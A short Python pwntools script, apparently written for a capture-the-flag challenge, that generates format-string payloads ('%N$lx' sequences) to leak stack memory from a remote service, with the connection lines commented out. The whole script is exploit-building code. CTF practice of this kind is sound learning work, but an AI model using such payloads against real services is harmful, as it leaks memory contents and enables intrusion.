from pwn import * 

# re = remote('printful.challs.pwnoh.io', 1337, ssl=True)

# print(re.recvall(timeout=2).decode())

i = 0
while i < 8*8:
    payload = f"%{i + 1}$lx %{i + 2}$lx %{i + 3}$lx %{i + 4}$lx %{i + 5}$lx %{i + 6}$lx"
    # re.sendline(payload.encode())
    # print(re.recvline(timeout=3).decode())
    print(payload)
    i+= 6
# re.interactive()